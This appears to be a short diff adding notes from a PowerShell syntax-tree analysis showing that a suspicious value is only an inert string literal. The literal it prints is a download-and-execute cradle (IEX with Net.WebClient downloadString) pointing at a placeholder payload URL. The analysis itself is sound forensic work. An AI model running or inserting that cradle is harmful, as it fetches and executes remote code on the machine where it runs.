@@ -1,0 +1,4 @@
+Input is an inert double-quoted string with a reserved domain.
+AST types: ScriptBlockAst, NamedBlockAst, PipelineAst, CommandExpressionAst, StringConstantExpressionAst
+Literal value: IEX(New-Object Net.WebClient).downloadString('https://example.invalid/payload.txt')
+The output alone does not verify the complete historical PowerShell session.
